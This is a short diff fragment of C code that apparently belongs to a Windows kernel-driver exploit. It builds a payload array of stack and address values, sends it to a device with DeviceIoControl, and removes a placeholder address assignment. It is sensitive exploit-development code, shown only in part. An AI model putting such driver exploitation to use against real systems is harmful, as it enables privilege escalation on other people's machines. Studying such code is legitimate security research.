@@ -102,8 +102,6 @@ int main(){
         payload[i] = ADDR(STACK_VAL[i]);
     }
 
-    payload[37] = ADDR(0xaabbccdd);
-
     BOOL result3 = DeviceIoControl(
         hDevice,
         DeVioctlCode,
